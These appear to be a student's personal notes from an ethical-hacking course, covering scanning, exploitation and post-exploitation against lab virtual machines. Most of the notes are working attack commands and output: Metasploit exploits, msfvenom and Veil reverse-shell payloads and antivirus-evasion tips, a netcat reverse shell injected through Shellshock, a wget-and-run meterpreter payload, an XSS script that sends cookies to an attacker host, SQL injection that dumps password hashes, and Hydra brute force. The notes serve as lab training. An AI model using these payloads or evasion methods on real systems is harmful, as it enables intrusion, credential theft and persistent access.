# Section 1 : Introduction
course sections :
- hacking lab
- python intro
- reconnaissance (nmap) & scanning
- vulnerbaility analysis
- exploit (use of metasploit on kali)
- post-exploit
- website pen-test (brute force scripts)
- man-in-the-middle
- wifi cracking

differences white hat VS black hat

# Section 2 : setup hacking lab
## setup hyperV kali vm
- get full-screen :
```
In /etc/default/grub change GRUB_CMDLINE_LINUX_DEFAULT=”quiet” to GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash video=hyperv_fb:your_resolution″ for me it was GRUB_CMDLINE_LINUX_DEFAULT=”quiet splash video=hyperv_fb:1920×1080″. Save file then run sudo update-grub and restart.
```
 [source](https://unix.stackexchange.com/questions/491737/how-to-enable-the-full-screen-mode-for-kali-linux-on-hyper-v-virtual-machine)

create an external switch and 
```
sudo dhclient -v -r and sudo dhclient -v
```
[source](https://superuser.com/questions/469806/windows-8-hyper-v-how-to-give-vm-internet-access)

##  stages of pen-test
1. Reconnaissance/data gathering
objectives : plan attack
web search + 

2. Scanning
objectives : list assets + vulnerbilities
nmap

3. exploitation/Gaining acces
exploit cve

4. maintaining access
optionnal : install rootkit/backdoor

5. covreing tracks
rm logs/files, revert changes, etc.

# Section 3 : *-nix OS intro

# Section 4 : Reconnaissance/data gathering
Active infos gathering != Passive infos gathering

## Active infos gathering
- use of kali tools
- get data from target (GET requests, talk with target employee=social engeineering, etc.)

## Passive infos gathering
- use of kali tools
- use of a middle source (google, website, etc.) = no direct contact with contact

## objectives
- ip ranges
- technologies/tools used by target
- phones

## get ip address
ipv6 adress :
```
ping google.com
```
ipv4 address :
```
ping google.com -4
```
nslookup = query DNS
whois <website adress or ip> = get whois data

## whatweb tool : stealthy website scan
- get technos run by website (lamp stack, etc.)
- warning : do not perform aggressive scan without authouriwation
cmd = `whatweb reddit.com -v`

## ip range scan
cmd = `whatweb 192.168.1.0/24 --aggression 3 -v --no-errors --log-verbose=file.txt`

## gathering email with theHarvester and hunters.io
cmd = `theHarvester -d <domain> -b all -l 200`
or use hunter.io


## Get additional tools
[top 25 OSINT tools for pro](https://securitytrails.com/blog/osint-tools)
- [red hawk](https://github.com/Tuhinshubhra/RED_HAWK) : "All in one tool for Information Gathering and Vulnerability Scanning"
list of DNS records [source](https://simpledns.plus/help/dns-record-types) :
    A (Host address)
    AAAA (IPv6 host address)
    ALIAS (Auto resolved alias)
    CNAME (Canonical name for an alias)
    MX (Mail eXchange)
    NS (Name Server)
    PTR (Pointer)
    SOA (Start Of Authority)
    SRV (location of service)
    TXT (Descriptive text)
cmd = `php rhawk.php`

- [sherlock](https://github.com/sherlock-project/sherlock) : " Hunt down social media accounts by username across social networks"
cmd = `python sherlock <username>`

# Section 5 : scanning
- focus on tech side of data gathering
- **WARNING** : it's forbiden to scan, so use honeypot or local virtualized vulnerable assets for training purpose
- objectives
1. look for open ports (80:web + 443 for ssl ; 21:ftp ; 22:ssh ; 53:DNS ; 25:smtp)

## TCP & UDP protocols
- TCP = most common on internet (tansfer protocol protocol)
1. (a->b) SYN : ask to establish conn
2. (b->a) SYN/ACK
3. (a->b) ACK : establish conn
TCP garantee packet are received and received in order + resend if fail/corruption/errors

- UDP (user datagram protocol)
no reception garanty, tradeof = much faster than TCP
use for broadcast/live/etc.

## Scans - nmap
cmd : `sudo arp -a` 
arp : access machine arp cache

cmd : `sudo netdiscover` = list connected assets on local network (192.168.<1-254>.0/24)

`nmap <metasploitable ip<>`
[type of scan](https://nmap.org/man/fr/man-port-scanning-techniques.html)

SYN scan :
`nmap -sS <metasploitable ip>`
send SYN request, if response=SYN/ACK then port=open
no connection open at end of scan

SYN full handshake scan :
`nmap -sT <metasploitable ip>`
send SYN request,
if response=SYN/ACK then port=open, then send ACK to establish conn
if response=RST, then port=closed

-sU(Scan UDP)

--scanflags(Scan TCP personnalisé)
-sI <zombie host[:probeport]>[Scan passif -- idlescan](https://nmap.org/book/idlescan.html)

## Get target OS
`nmap -O <metasploitable ip>`
When creating honeypot : change mac address so it doesn't have standard mac address of vm (example 08:00:27:* for VB)


## Get service name and version
`nmap -sV <metasploitable ip> --version-intensity <1-9, default=7>`

more aggressive scan including nmap scripts
`nmap -A <metasploitable ip>`

## limit nmap port range
list up hosts : `nmap -sn <local net work ip>/24`

limit port : `nmap -p 80,22 <ip>`
all port : : `nmap -p 1-65534 <ip>`
scan top 100 ports : : `nmap -F <ip>`
output results to file : `nmap <options> >> file.txt` OR `nmap <options> -oN file.txt`

## Bypass Firewall/IDS/IPS
- use decoy and packet fragmentation

fragmentation :
- `sudo nmap -f <ip>`
- `sudo nmap -f -f <ip>`
- `sudo nmap -f <ip>`

decoy : scan from multiple ip address
- `sudo nmap -D RND:<number of random ip addresses> <ip>`
- `sudo nmap -D <ip a>,<ip b>,ME <ip>`

impersonate ip adress
- `sudo nmap  -S <ip to impersonate if use of 8.8.8.8 we won't get the request response> -Pn` : but we 

options :
-S 8.8.8.8 (impersonate ip for scan)
-Pn (treat all hosts as online)
-e (use specific interface) eth0
-g (specify scan source port)
-T (set timing template)

# Section 6 : Py port scanner project
- [py socket lib](https://docs.python.org/3/library/socket.html)
- refer to "python_projets/tools/portscanners.py"

# Section 7 : Vulnerability Analysis
## nmap
- nmap scripts in /usr/share/nmap/scripts
- https://nmap.org/book/man-nse.html
- https://nmap.org/book/nse-usage.html#nse-categories
run all script of a category
`sudo nmap --script auth <ip> -sS` : find default login per service
`sudo nmap --script malware <ip> -sS` : 
`sudo nmap --script banner <ip> -sS` : find exact version running per service
`sudo nmap --script vuln <ip> -sS` : look for existing vulnerability

run only one script
`sudo nmap --script-help <script name>.nse`
`sudo nmap --script <script name>.nse <ip>`

## manual vuln search
- ask google for cve/exploit
- use `searchploit <service name, ex : postgresql>`

## Nessus (from Tenable)

# Section 8 : Exploit and gain access
## reverse shell
- make target to connect to attacker host

## bind shell
- target machine open port for attacker host->target conn
- FW rule prevent non-legit port to open

## Metasploit framework
list of modules (`ls -al /usr/share/metasploit-framework/modules`)
- auxiliary : actions before exploit (scanning, vulnerability scans, fingerprinting, etc.)
- encoders : evade IDS/IPS detection by encoding payload
- evasion : evade IDS/IPS detection
- ready-to-use exploits
- nops : instruction for CPU to do nothing
  - usefull for buffer overflow payload
  - allocate mem before payload exec
- payloads
  - single = standalone payload
  - stagers = setup net conn target<->attacker, simple ans reliabale
  - stages = downloaded by stagers modules, no size limit, include interpreters (pack of tools), etc.
- post

Basics cmd (open msf concole : `msfconsole`):
- `show payloads`
- `show exploits`
- `use <module name, ex:exploit name from show cmd>`
    - `show info`
    - `show options`
    - `show targets`
    - `set <param> <value>`
    - `show payloads` : payloads for current exploit only
    - `exploit`

# Section 8 
## netcat exploit
cd scan_metasplitable.txt
use netcat

`nc <metasploitable ip>`

## Telnet exploit
```
┌──(kali㉿kali)-[~]
└─$ searchsploit Linux telnetd
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
netkit-telnet-0.17 telnetd (Fedora 31) - 'BraveStarr' Remote Code Execution                                                                                                                                 | linux/remote/48170.py
TelnetD encrypt_keyid - Function Pointer Overwrite                                                                                                                                                          | linux/remote/18280.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcode Title                                                                                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux/MIPS (Little Endian) - system(telnetd -l /bin/sh) Shellcode (80 bytes)                                                                                                                                | linux_mips/27132.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
conclusion : beware of what you put in ssh, telnet banners!

`telnet <metasploitable ip>`
`sudo su`

## Samba exploit

```
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```
```
msfconsole
search samba
use auxiliary/scanner/smb/smb_version
show info
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS <metasploitable ip>
RHOSTS => <metasploitable ip>
msf6 auxiliary(scanner/smb/smb_version) > run

[*] <metasploitable ip>:445      - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] <metasploitable ip>:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] <metasploitable ip>:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
searchsploit samba
┌──(kali㉿kali)-[~]
└─$ searchsploit Samba 3.0.20
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                      | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                            | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                       | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                       | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                               | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```
msf6 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS <metasploitable ip>
RHOSTS => <metasploitable ip>
msf6 exploit(multi/samba/usermap_script) > run
```

## SSH : bruteforce attack

msfconsole
```
search ssh
msf6 exploit(multi/samba/usermap_script) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set  PASS_FILE /home/kali/dev/exploits_files/passwords.txt
PASS_FILE => /home/kali/dev/exploits_files/passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/kali/dev/exploits_files/usernames.txt
USER_FILE => /home/kali/dev/exploits_files/usernames.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  2         shell linux  SSH kali @   <kali ip>:34681 -> <metasploitable ip>:22  (<metasploitable ip>)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[-] Invalid session identifier: 1
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
```

## Exploits challenge
tools : nmap, msfconsole, google

21/tcp   open  ftp         vsftpd 2.3.4
```
msf6 auxiliary(scanner/ftp/anonymous) > search ftp scan
msf6 auxiliary(scanner/ftp/anonymous) > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/anonymous) > search distc

msf6 auxiliary(scanner/ftp/anonymous) > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 auxiliary(scanner/ftp/ftp_version) > search UnrealIRCd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 auxiliary(scanner/ftp/ftp_version) > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS <metasploitable ip>
RHOSTS => <metasploitable ip>
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

```


```
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$     searchsploit ftp 2.3.4

┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSSH 4.7p1

┌──(kali㉿kali)-[~]
└─$ searchsploit apache 2.2.8

# scan all port
sudo nmap -sV <vm ip> -p-

vncviewer <metasploitable ip>
```


~~need to open port 4444 on kali~~
~~netstat -lnu~~
~~┌──(kali㉿kali)-[~/dev/Ethical_Hacking_learning]~~
~~└─$ sudo ufw allow 4444~~

## Windows 7 exploits
SMB ports :
139
445
breach : Ethernal Blue
patch of SMBv1 flaws in 2020

### get and install additional exploit
install wine + exploit + windows python2
```
┌──(kali㉿kali)-[~/dev/Ethical_Hacking_learning]
└─$ sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32

as root 
wine msiexec /i python2.7.msi
┌──(kali㉿kali)-[~/dev/doublepulsar]
└─$ sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps /usr/share/metasploit-framework/modules/exploits/windows/smb -r
┌──(kali㉿kali)-[~/dev/doublepulsar]
└─$ sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
┌──(kali㉿kali)-[~/dev/doublepulsar]
└─$ sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps /root/ -r
┌──(kali㉿kali)-[~/dev/doublepulsar]
└─$ sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /root 
┌──(kali㉿kali)-[~/dev/doublepulsar]
└─$ sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit /root -r 
```
use new exploit 
```
use windows/smb/eternalblue_doublepulsar
```

### Bluekeep

## Routersploit

```
https://github.com/threat9/routersploit.git
<install proc>
python3 rsf.py
```

get routeur ip :
msf6 exploit(windows/smb/eternalblue_doublepulsar) > netstat -nr

# Section 9 : Win10 exploit, SMBGhost
- get win 10 old iso with [RUFUS](https://rufus.ie)
- find CVE and exploit it with custom script (google it, lot of result in github repo)

# Section 10 : Gaining access
## Generate payload with Msfvenom
```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exe -o shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
copy payload to win8.1 or win10 test VM :

need to create an archive so my company IPS doesn't delete the file as it scan and detect it as a payload :
┌──(kali㉿kali)-[~]
└─$ tar -czvf tmp.tar.gz shell.tmp 


```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <kali ip>
LHOST => <kali ip>
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <kali ip>:5555 
```
run shell on windows machine : failed : not the right OS plateform for win10!

restart the process with defining plateform for msfvenom

msfvenom --list platforms
-> windows
msfvenom --list archs
->  x64

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exe -o shell.exe -a x64 --arch x64 --platform windows

same issue ...

- test if payload is detectable : virustotal.com

```
# encode payload
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f powershell -o shell.ps1 -a x64 --arch x64 --platform windows -e x64/zutto_dekiru -i 13 -n 442 

# use other software as template, ex=putty.exe
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exec -o Putty.exe -a x64 --arch x64 --platform windows -x putty.exe 
## IDS detects and delete it!

# use other software as template, ex=putty.exe + obfuscate it
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=5555 -f exe -o Putty.exe -a x64 --arch x64 --platform windows -x putty.exe -e x64/zutto_dekiru -i 13 -n 442 
## IDS doesn't detect/delete Putty.exe, but it blocks its tentative to establish tcp connection !
```

Conclusion : The IDS/IPS is working fine for theses basic cases!

## Use veil to create payload
install veil (evasion and ordnance tool) :
```
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ sudo apt-get install veil       
[sudo] password for kali: 
...
```
Veil console
```
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ veil

Veil>: use 1
Veil>: list
...
22)	powershell/meterpreter/rev_tcp.py
...
Veil/Evasion>: use 22
[powershell/meterpreter/rev_tcp>>]: set SLEEP 42
[powershell/meterpreter/rev_tcp>>]: set LHOST <kali ip>
[powershell/meterpreter/rev_tcp>>]: generate
 [>] Please enter the base name for output files (default is payload): powerpayload

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/powerpayload.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/powerpayload.rc

```

- get tool to convert .bat to .exe : 
  - ~~https://www.01net.com/telecharger/utilitaire/manipulation_de_fichier/bat2exe.html~~
  - https://github.com/tokyoneon/B2E

```
┌──(kali㉿kali)-[~/dev/tools]
└─$ wine Portable/Bat_To_Exe_Converter_\(x64\).exe 
```
- converted payload got detected and deleted by IDS/IPS
- use start tcp handler with msfconsole
```
msf6 > resource /home/kali/dev/exploits_files/powerpayload.rc
```

## Use "the fat rat" to create payload
- https://github.com/screetsec/TheFatRat + follow instructions
- **warning** : **don't upload backdoor to virus total**, but upload it to **nodistribute.com**

```
┌──(kali㉿kali)-[~/dev/tools]
└─$ sudo /home/kali/dev/tools/TheFatRat/fatrat
...
	[06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
...
 ┌─[TheFatRat]──[~]─[menu]:
 └─────► 6
...
	[2]  Create exe file with C# + Powershell (FUD 100%)
...
 ┌─[TheFatRat]──[~]─[pwnwind]:
 └─────► 2
# set options ... LHOST LPORT, [ 3 ] windows/meterpreter/reverse_tcp 
```

- converted payload got detected and deleted by IDS/IPS, again xD
- source : https://www.udemy.com/course/complete-ethical-hacking-bootcamp-zero-to-mastery module 10, lesson 86
```
Note: My Payloads Are Getting Detected By An Antivirus!

A game of cat and mouse ..

Viruses and Antiviruses!

We are going to talk about them in the next video but I just want to mention a few things first.

There is no clear way of bypassing antiviruses!

These methods get outdated all the time and new ones occur. However there are things that you can do to make your payload less detected.

1) The best possible thing that you can do is to create your own Payload (code it yourself). Why ? Well if you create it yourself chances are that same code didnt occur before and it will be unknown to the antivirus vendors. Your unique code once compiled will give a completely different binary that isnt in the database of that antivirus.

2) If you dont yet know how to create your own payloads/viruses/backdoors and you are using softwares like Msfvenom or Veil or similar. Make sure to change that payload as much as possible. If there are some random options you can add, make sure to add them (such as program sleeping for X amount of seconds etc.). Then you can use hexeditor that we will see in the next video to change binary a little bit in order to get different file hash which can help you bypass some antiviruses.

3) Keep an eye for new tools that are using to create payloads/make them undetectable. Both TheFatRat and Veil when they came out produced undetectable payloads. But then once tool becomes known and people start using it, those payloads are uploaded to virus total and eventually become known to antiviruses. However new tools come out all the time, so you can keep an eye out once they come out in order to possibly bypass more antiviruses with that new tool!

4) IF you have a source code to the payload, try changing the code a little bit. Try adding a random function inside the code that doesnt do anything. Then once you compile the program afterwards with that random function it will give a completely different binary to you compared to other people creating payload with that tool just because you added that function.

These are just some of the ways, and I mention them in the next video. 2 important things I would take out from this is to:

    Create your own payloads

    Keep yourself updated with new tools
```

## Hexeditor & antiviruses
### change md5sum of a file
- check md5sum of file (renaming doesn't change hash) : md5sum file.extension
- edit non critical text : hexeditor file.extension
- edit source code : add random useless stuff

payload file not detected and delete as other, but communication try blocked by IDS

## make payload open image
- find .png to .ico file
- read doc about sfx archive : need winrar or 7zip

# Section 11 Post exploit : modules, privileges escalation, data extract, etc.
## privilege escalation
`msf6 > session -i [1-X]`
- use bg (background cmd), upload/download cmd, getuid (get current hostname + username), core cmd, network cmd (ifconfig, netstats : list all open connections, ), etc.
- ps (list pid + process name)
- keyscan* cmd
- getsystem : elevate to admin
- bypass user account control for elevation
```
msf6 > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
...
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

...
msf6 > search bypassuac
msf6 > use exploit/windoxs/local/...
msf6 > set SESSION X (meterpreter session)
msf6 > run
```


## persistence on target system
- make a payload available on a web server :
```
systemctl start apache2
# rm or backup index file in var/www/html
mv <payload> var/www/html
```
- use persistence modules :
```
msf6 > search persistence
   17  exploit/windows/local/persistence_service 
msf6 > use exploit/windows/local/persistence_service 
msf6 > set SESSION X
set RETRY_TIME 17
set RETRY_TIME 17
set LHOST <kali ip>
...
```
- search all post exploitation modules
```
msf6 > search post
...
```

# Section 12 backdoor pydev
- kali : run server instance (send cmd)
- victim : run client instance (send cmd output)
## code
available in udemy/Ethical_Hacking_learning/python_projects/backdoor

## setup python on win10 test vm
- install python3
pip install -U pyinstaller
- get client.py on vm
pyinstall client.py --noconsole --onefile
- executable in dist folder, contains exec file, not detected as threat by IDS

## test backdoor
```
download C:\Users\IEUser\Documents\module12\test_doc.txt #OK
upload /home/kali/dev/formation/udemy/Ethical_Hacking_learning/python_projects/backdoor/moustache.txt #KO
[+] Listening for incomming connections...
[+] Target connected from : ('<win10 vm ip>', 50120)
* Shell~('<win10 vm ip>', 50120): dir
 Volume in drive C is Windows 10
 Volume Serial Number is E88E-9782

 Directory of C:\Users\IEUser\Documents\module12\dist

09/15/2022  07:39 AM    <DIR>          .
09/15/2022  07:39 AM    <DIR>          ..
09/15/2022  07:39 AM         6,347,195 client.exe
               1 File(s)      6,347,195 bytes
               2 Dir(s)  25,498,275,840 bytes free

* Shell~('<win10 vm ip>', 50120): cd ..
* Shell~('<win10 vm ip>', 50120): dir
 Volume in drive C is Windows 10
 Volume Serial Number is E88E-9782

 Directory of C:\Users\IEUser\Documents\module12

09/15/2022  07:39 AM    <DIR>          .
09/15/2022  07:39 AM    <DIR>          ..
09/15/2022  07:39 AM    <DIR>          backdoor
09/15/2022  07:39 AM    <DIR>          build
09/15/2022  07:39 AM               866 client.spec
09/15/2022  07:39 AM    <DIR>          dist
09/15/2022  07:34 AM                18 test_doc.txt
               2 File(s)            884 bytes
               5 Dir(s)  25,498,275,840 bytes free

* Shell~('<win10 vm ip>', 50120): upload moustache.txt #OK
```

# Section 13 : Webapp pentest
## Intro
## Info gathering, Dirb tool
- use scanning tools : dirb tool, harvester, nmap, etc.
- dirb : scann website, like owasp tool
```
┌──(kali㉿kali)-[~]
└─$ dirb http://<metasploitable ip>
```

## ShellShock exploit
- get and create vulnerable vm : https://pentesterlab.com/exercises/cve-2014-6271/attachments
- access it's web homepage and look at web response with burp
- bash empty fct : `() { :;};`
- shellshock vuln = write any cmd after empty function

### manual exploit
- use burb repeater to reapat a request : add `() { :;}; /bin/bash -c 'nc <kali ip>'` in Use-Agent :
`User-Agent: () { :;}; /bin/bash -c 'nc <kali ip> 12345 -e /bin/bash'`
- setup listerner on kali + exec cmd
```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 12345
listening on [any] 12345 ...
connect to [<kali ip>] from vulnerable.home [<shellshock ip>] 37813
hostname
vulnerable
whoami
pentesterlab
```

### exploit with msfconsole
```
msf6 > search shellshock
...
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec
...
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPATH /cgi/bin/status
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS <shellshock vm ip>
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status #web path after ip
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RPATH /bin 
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on <kali ip>:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (989032 bytes) to <shellshock vm ip>
[*] Meterpreter session 1 opened (<kali ip>:4444 -> <shellshock vm ip>:52124) at 2022-09-16 14:53:32 +0200

meterpreter > getuid
Server username: pentesterlab
```

## cmd inject vuln
- set metasploitable webapp security to low : http://<metasploitable ip>/dvwa/security.php
- inject cmd to http://<metasploitable ip>/dvwa/vulnerabilities/exec/# : ` ; <cmd>`
- click view source : no input validation
- use nc to get access : same as shellshock manual exploit
- set metasploitable webapp security to medium : http://<metasploitable ip>/dvwa/security.php
  - poor input valid (exclude some chars)
- set metasploitable webapp security to high
  - strong input validation

## get meterpreter with cmd exec
- create py meterpreter payload 
```
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ msfvenom -p python/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=4446 >> meterpreter_payload.py
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ sudo cp meterpreter_payload.py /var/www/html
┌──(kali㉿kali)-[~/dev/exploits_files]
└─$ sudo service apache2 start      
```
- from web cmd inject
```
| wget http://<kali ip>/meterpreter_payload.py
ls
```
- from msf
```
use exploit/multi/handler 
set payload python/meterpreter/reverse_tcp
set LHOST <kali ip>
set LPORT 4446
run
```
- from web cmd inject
```
| python meterpreter_payload.py
```
- got meterpreter session :
```
meterpreter > getuid
Server username: www-data
```

## Reflected XSS + cookie stealing
### stored XSS on victim server
- find xss vuln website
- exec .js in victim website
- anyone who visit website will exec .js

### reflected xss
- victim server does'nt store .js
- send link with js code
- set security=low
- code run only once on script post
- http://<metasploitable ip>/dvwa/vulnerabilities/xss_r/
```
<script>alert('Waf')</script>
```
- security=medium
KO :
```
<script>alert('Waf')</script>
```
OK :
```
<Script>alert('Waf')</Script>
```
```
<scr<script>ipt>alert('Waf')</Script>
```

- server simple http server
python -m http.server 8001 
- js script to get cookie (document.cookie=cookie session of user visiting page)
```
<Script>document.write('<img src="http://<kali ip>:8001/' + document.cookie + ' ">');</Script>
```

### stored xss
- code stored server-side (example = comment on a blog)
- set metasploitable security=low -> no data filter
- navigate to xss stored : - http://<metasploitable ip>/dvwa/vulnerabilities/xss_s/
- code run on every page load
- sevurity=medium -> data filtering -> need to edit DOM maxlength pram for name field (with inspect tool)
  - `<Script>alert('Waf')</Script>` run=success

### html injection
- inject html
- http://<metasploitable ip>/dvwa/vulnerabilities/xss_r/ and - http://<metasploitable ip>/dvwa/vulnerabilities/xss_s/
- html examples :
  - \<h1\>PATATE\<\/h1>
  - \<meta http-equiv="refresh" content=0; url=http://google.com" \/\> : create infinite failed refresh loop
  
### sql inject
- http://<metasploitable ip>/dvwa/vulnerabilities/sqli
- error based sqli when we get error msg
  - 2' and '1'='1
  - 2' order by 1 -- '
  - 2' order by 2 -- '
  - 2' order by 3 -- ' - return error so there is only 2 columns
  - 2' union select database(),user() -- ' return
      - ID: 2' union select database(),user() -- '
      - First name: dvwa -> db name
      - Surname: root@localhost -> 
  - 2' union select schema_name, 2 from information_schema.schemata -- '
    -> return all DB infos
  - 2' union select table_name, 2 from information_schema.tables where table_schema = 'dvwa' -- '
    -> get list of tables for db=dvwa
  - 2' union select column_name, column_type from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' -- '
    -> get list of all column (including user and password column)
  - 2' union SELECT concat(user_id,':',first_name,':',last_name), concat(user,':',password) from dvwa.users -- ' 
    -> get list of username-hashed passw, it looks like md5hash, use md5 decoder to decode password, if it's a simple password it's easy to find

- blind sqli when no error displayed

### CSRF (cross side request forgery)
- exploit any web request in current web session with vulnerability = exec payload on other website on current web session
- http://<metasploitable ip>/dvwa/vulnerabilities/csrf view page source and copy form fiv, to create a new html page and serve it with apache2 kali instance (/var/www/html), access it via http://localhost/csrf.html
```
    <form action="http://<metasploitable ip>/dvwa/vulnerabilities/csrf/" method="GET">    New password:<br>
    <input type="password" AUTOCOMPLETE="off" name="password_new" value="new_psw"><br>
    Confirm new password: <br>
    <input type="password" AUTOCOMPLETE="off" name="password_conf" value="new_psw">
    <br>
    <input type="submit" value="Change" name="Change">
    </form>
```
- action : redirect
- field_name : add value with html value balise
- access http://localhost/csrf.html to change psw and login back to app with new psw to test it
- redo the same operation with full html page code to look similar : http://<kali ip>/csrf_full.html CSS file missing
- add css file in csrf html page :
  - get css files +js file + ico files + copy them in /var/www/html update their paths in csrf_full.html : got to page source, click css file link and copy them

### BruteForce with Hydra
- general syntax : `└─$ hydra <metasploitable ip> http-form-post "/dvwa/login.php:<user field name>=^USER^:<psw field name>=^PASS^&<submit button name>=<submit button type>:<option add failed login string to search for>"`
- fields names are to be found in page source
- login page :
```
